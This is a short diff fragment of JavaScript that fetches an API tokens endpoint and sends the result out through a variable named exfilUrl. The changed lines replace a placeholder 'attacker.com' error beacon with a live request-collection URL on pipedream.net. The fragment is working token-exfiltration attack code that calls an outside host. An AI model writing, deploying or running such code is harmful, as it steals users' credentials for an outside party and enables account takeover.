@@ -23,6 +23,6 @@ fetch("/api/tokens/697a3b225493767b73bb7bd8", {
   fetch(exfilUrl, { mode: "no-cors" });
 })
 .catch(err => {
-  const errorUrl = "https://attacker.com?error=" + encodeURIComponent(err.message);
+  const errorUrl = "https://eoeqgca83zpr7tb.m.pipedream.net?error=" + encodeURIComponent(err.message);
   new Image().src = errorUrl;
 });
